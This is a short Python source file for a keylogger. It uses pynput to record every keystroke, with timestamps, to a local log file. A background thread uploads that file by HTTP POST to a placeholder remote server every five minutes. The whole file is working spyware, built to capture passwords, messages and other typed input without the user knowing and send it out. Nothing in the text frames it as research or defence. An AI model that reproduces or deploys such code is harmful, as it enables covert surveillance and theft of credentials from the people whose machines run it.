from pynput import keyboard
import logging
import os
import requests
import threading
import time

log_dir = ""
log_file = os.path.join(log_dir, "key_log.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

def send_log_file():
    while True:
        if os.path.exists(log_file):
            with open(log_file, 'rb') as f:
                requests.post("http://<server_ip>:5000/upload", files={'file': f})
        time.sleep(300)  # Send log file every 5 minutes

if __name__ == "__main__":
    threading.Thread(target=send_log_file).start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
